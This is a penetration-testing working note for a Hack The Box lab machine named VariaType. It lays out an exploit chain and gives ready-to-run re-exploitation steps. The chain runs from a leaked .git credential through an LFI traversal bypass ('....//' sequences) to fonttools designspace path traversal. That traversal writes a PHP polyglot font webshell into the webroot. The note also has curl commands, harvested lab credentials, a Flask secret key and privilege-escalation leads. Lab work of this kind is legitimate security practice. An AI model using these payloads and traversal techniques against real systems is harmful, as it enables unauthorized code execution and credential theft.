# VariaType — 10.129.17.22 (previously 10.129.244.202)

**Status:** www-data RCE achieved previously, box reset, need to re-exploit. Steve privesc still unsolved.

## Attack Chain (Proven)

1. **Git dump on portal** → `portal.variatype.htb/.git/` exposed → gitbot:G1tB0t_Acc3ss_2025!
2. **Portal LFI** → `download.php?f=....//....//....//....//....//etc/passwd` (single-pass `str_replace("../","")` bypass)
3. **Flask source read** → `/opt/variatype/app.py` via LFI
4. **Designspace format 5.0 output path traversal** → fonttools writes variable font to arbitrary path
5. **PHP polyglot font** → PHP code in name table survives fonttools compilation → webshell as www-data

## Critical Discovery This Session: Target fonttools Lacks Path Sanitization

**Target fonttools version** at `/usr/local/lib/python3.11/dist-packages/fontTools/varLib/__init__.py`:

```python
# TARGET (vulnerable - NO basename protection):
filename = vf.filename if vf.filename is not None else vf.name + ".{ext}"
vf_name_to_output_path[vf.name] = os.path.join(output_dir, filename)
```

```python
# NEWER versions (patched - HAS basename protection):
filename = os.path.basename(vf.filename)  # strips path traversal
```

**Exploit mechanism:** In designspace format 5.0, `<variable-font filename="../../path/to/cmd.php">` controls the output path. On the target, this path is used AS-IS without `os.path.basename()`, allowing full path traversal AND arbitrary extension (no forced .ttf).

## Exploit Files Ready

- `exploits/build_rce_font.py` — Builds two master TTFs with PHP payload in name table (trademark field)
- `exploits/upload_rce.py` — Uploads designspace + masters to `/tools/variable-font-generator/process`
- `exploits/TestFamily-Light.ttf` / `TestFamily-Bold.ttf` — Pre-built master fonts with `<?php system($_GET["cmd"]); ?>` in name table
- `exploits/config.designspace` — Template designspace (needs traversal path added for upload)

### Upload designspace format (the key payload):

```xml
<designspace format="5.0">
  ...
  <variable-fonts>
    <variable-font name="TestFamilyVF" filename="../../../../../../var/www/portal.variatype.htb/public/cmd.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

### How to re-exploit:

```bash
# 1. Update /etc/hosts with new IP
# 2. Login to portal for LFI cookie
curl -s -c /tmp/cookies.txt -L -d "username=gitbot&password=G1tB0t_Acc3ss_2025!" "http://portal.variatype.htb/"

# 3. Run upload script (update IP in /etc/hosts first)
cd /htb/machines/box2/exploits && python3 upload_rce.py

# 4. If upload script fails, use curl directly:
curl -X POST "http://variatype.htb/tools/variable-font-generator/process" \
  -F "designspace=@rce.designspace;filename=config.designspace" \
  -F "masters=@TestFamily-Light.ttf" \
  -F "masters=@TestFamily-Bold.ttf"

# 5. Test webshell
curl "http://portal.variatype.htb/cmd.php?cmd=id"
```

## Post-Shell Survey (from previous session)

### System Info
- OS: Debian 12 (bookworm), kernel 6.1.0-43-amd64
- SSH: OpenSSH 9.2p1 (key-only auth)
- HTTP: nginx 1.22.1, PHP 8.2, Flask on port 5000

### Users
- **steve** (uid 1000) — target for privesc, runs font processing cron
- **www-data** — current shell
- **variatype** (uid 102, group www-data) — service user

### Steve's Cron Job
- Runs `/home/steve/bin/process_client_submissions.sh`
- Processes fonts from `/var/www/portal.variatype.htb/public/files/`
- Iterates: `*.ttf *.otf *.woff *.woff2 *.zip *.tar *.tar.gz *.sfd`
- Executes: `fontforge -lang=py -c "...font = fontforge.open('$file')..."`
- fontforge version: 20230101, built 2025-12-07 from commit a1dad3e
- Full source at `/usr/local/src/fontforge/`

### Root Privesc (Mapped, Requires Steve First)
- `/opt/font-tools/install_validator.py` → setuptools PackageIndex RCE
- Need steve access before this can be exploited

## www-data → steve: Dead Ends

1. **Python CWD module hijack** — DEAD. System `/usr/lib/python3.11/sitecustomize.py` shadows CWD modules. fontforge's Py_Initialize() never loads from CWD.
2. **SFD PickledData deserialization** — DEAD. fonttools stores as raw string, `pickle.loads()` only on explicit `font.persistent` access (steve's script never does this).
3. **SFD system() injection** — DEAD. `system()` in sfd.c:3332 is in SAVE function (compression), not LOAD. Not triggered by `fontforge.open()`.
4. **Filename injection** — DEAD. Regex filter `^[a-zA-Z0-9._-]+$` blocks all special chars.
5. **XXE in .designspace** — DEAD. fonttools uses safe parser.

## www-data → steve: Unexplored Angles

### 1. SFD Parser Deep Review (HIGHEST PRIORITY)
- `/usr/local/src/fontforge/sfd.c` — ~6000 lines of C code
- Need to trace ALL code paths triggered by `fontforge.open()` on SFD files
- Look for: exec, system, popen, Python callouts, deserialization in LOAD path
- Previous review only checked PickledData, system(), and Script fields

### 2. fontforge pyhook/ Directory
- `/usr/local/src/fontforge/pyhook/` exists but unexplored
- May auto-load Python scripts from discoverable paths
- Test: can we place a hook in `/files/pyhook/` that gets loaded?
- Risk: likely blocked by same sitecustomize shadowing issue

### 3. fontforge CVEs for Version 20230101
- Research CVEs affecting this specific version
- Crafted font → buffer overflow → code execution during open()
- Check NVD, fontforge GitHub issues, security advisories

## Credentials

| User | Password | Source |
|------|----------|--------|
| gitbot | G1tB0t_Acc3ss_2025! | .git history on portal |
| Flask SECRET_KEY | 7e052f614c5f9d5da3249cc4c6d9a950053aed370b8464d2e8a81d41ff0e3371 | /opt/variatype/app.py |

## Key File Locations on Target

- Flask app: `/opt/variatype/app.py`
- Portal webroot: `/var/www/portal.variatype.htb/public/`
- Portal files dir: `/var/www/portal.variatype.htb/public/files/` (writable by www-data)
- Steve's script backup: `/opt/process_client_submissions.bak`
- Root privesc script: `/opt/font-tools/install_validator.py`
- fontforge source: `/usr/local/src/fontforge/`
- fonttools varLib: `/usr/local/lib/python3.11/dist-packages/fontTools/varLib/__init__.py`
- nginx portal config: `/etc/nginx/sites-enabled/portal.variatype.htb`
- nginx main config: `/etc/nginx/sites-enabled/variatype.htb`
